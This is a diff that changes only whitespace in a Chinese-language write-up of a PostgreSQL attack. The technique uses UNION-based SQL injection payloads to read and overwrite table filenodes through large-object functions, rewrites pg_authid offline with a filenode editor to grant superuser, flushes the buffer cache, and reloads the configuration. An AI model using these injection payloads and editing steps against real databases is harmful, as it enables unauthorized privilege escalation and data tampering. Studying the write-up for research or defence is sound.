@@ -274,7 +274,7 @@ $ python3 postgresql_filenode_editor.py -m list -f ./tests/sample_filenodes/4918
 编辑所需的行，将密码散列设置为MD5('12345678')值：
 
 ```bash
- $ python3 postgresql_filenode_editor.py -m update -p 0 -i 10 --csv-data '11,admin@example.com,Admin User,25d55ad283aa400af464c76d713c07ad,NULL,NULL' -f ./tests/sample_filenodes/49182 --datatype-csv "tableoid,oid,4,i;cmax,cid,4,i;xmax,xid,4,i;cmin,cid,4,i;xmin,xid,4,i;ctid,tid,6,s;id,int4,4,i;email,varchar,-1,i;fullname,varchar,-1,i;password,varchar,-1,i;city,varchar,-1,i;age,int4,4,i"
+$ python3 postgresql_filenode_editor.py -m update -p 0 -i 10 --csv-data '11,admin@example.com,Admin User,25d55ad283aa400af464c76d713c07ad,NULL,NULL' -f ./tests/sample_filenodes/49182 --datatype-csv "tableoid,oid,4,i;cmax,cid,4,i;xmax,xid,4,i;cmin,cid,4,i;xmin,xid,4,i;ctid,tid,6,s;id,int4,4,i;email,varchar,-1,i;fullname,varchar,-1,i;password,varchar,-1,i;city,varchar,-1,i;age,int4,4,i"
 ```
 
 重新上传编辑后的文件节点
@@ -286,7 +286,7 @@ $ python3 postgresql_filenode_editor.py -m list -f ./tests/sample_filenodes/4918
 覆盖磁盘上的文件节点
 
 ```sql
- -1 UNION SELECT 1,'a','b','c',lo_export(13338,'/var/lib/postgresql/13/main/base/13485/49182')
+-1 UNION SELECT 1,'a','b','c',lo_export(13338,'/var/lib/postgresql/13/main/base/13485/49182')
  ```
 
 此时，密码在数据库中仍然是旧的，因为表已加载到缓存中.
@@ -294,7 +294,7 @@ $ python3 postgresql_filenode_editor.py -m list -f ./tests/sample_filenodes/4918
 在服务器上进行大量查询刷新缓存.例如，创建一个大小与整个缓存池匹配的大对象，以从缓存中刷新目标表:
 
 ```sql
- -1 UNION SELECT 1,'a','b','c',lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
+-1 UNION SELECT 1,'a','b','c',lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
 ```
 
 该查询会溢出内存缓存，并且该users表应该已被卸载。我们可以通过重新运行查询并观察更新后的管理员密码哈希来确认：
@@ -338,7 +338,7 @@ postgres=> SELECT * FROM users;
 从文件对象中读取文件节点
 
 ```sql
- -1 UNION SELECT 1,'a','b',translate(encode(lo_get(13340), 'base64'), E'\n', ''),2
+-1 UNION SELECT 1,'a','b',translate(encode(lo_get(13340), 'base64'), E'\n', ''),2
  ```
 
 使用 PostgreSQL Filenode Editor 离线编辑表,我们可以在最后看到我们的用户 poc_update_user 的 oid 49153.我们需要将所有 rol* 设置翻转为 1 以模仿真正超级用户的权限.
@@ -368,7 +368,7 @@ postgres=> SELECT * FROM users;
 为了方便起见，任何不可打印的字段长度字段都可以作为 base64 字符串传递
 
 ```sql
- python3 postgresql_filenode_editor.py -f ./1260 --datatype-csv "tableoid,oid,4,i;cmax,cid,4,i;xmax,xid,4,i;cmin,cid,4,i;xmin,xid,4,i;ctid,tid,6,s;oid,oid,4,i;rolname,name,64,c;rolsuper,bool,1,c;rolinherit,bool,1,c;rolcreaterole,bool,1,c;rolcreatedb,bool,1,c;rolcanlogin,bool,1,c;rolreplication,bool,1,c;rolbypassrls,bool,1,c;rolconnlimit,int4,4,i;rolpassword,text,-1,i;rolvaliduntil,timestamptz,8,d" -m update -p 0 -i 13 --csv-data "49153,cG9jX3VwZGF0ZV91c2VyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==,1,1,1,1,1,1,1,-1,md5d30050478412f6f4d7fd340d0e46d403,NULL"
+python3 postgresql_filenode_editor.py -f ./1260 --datatype-csv "tableoid,oid,4,i;cmax,cid,4,i;xmax,xid,4,i;cmin,cid,4,i;xmin,xid,4,i;ctid,tid,6,s;oid,oid,4,i;rolname,name,64,c;rolsuper,bool,1,c;rolinherit,bool,1,c;rolcreaterole,bool,1,c;rolcreatedb,bool,1,c;rolcanlogin,bool,1,c;rolreplication,bool,1,c;rolbypassrls,bool,1,c;rolconnlimit,int4,4,i;rolpassword,text,-1,i;rolvaliduntil,timestamptz,8,d" -m update -p 0 -i 13 --csv-data "49153,cG9jX3VwZGF0ZV91c2VyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==,1,1,1,1,1,1,1,-1,md5d30050478412f6f4d7fd340d0e46d403,NULL"
 ```
 
 将编辑后的文件节点重新上传到大型对象中
@@ -411,5 +411,5 @@ postgres=# SELECT * FROM pg_authid;
 我们现在是超级管理员,可以重新加载配置
 
 ```sql
- -1 UNION SELECT 1,'a','b',pg_reload_conf()::text,1
+-1 UNION SELECT 1,'a','b',pg_reload_conf()::text,1
 ```
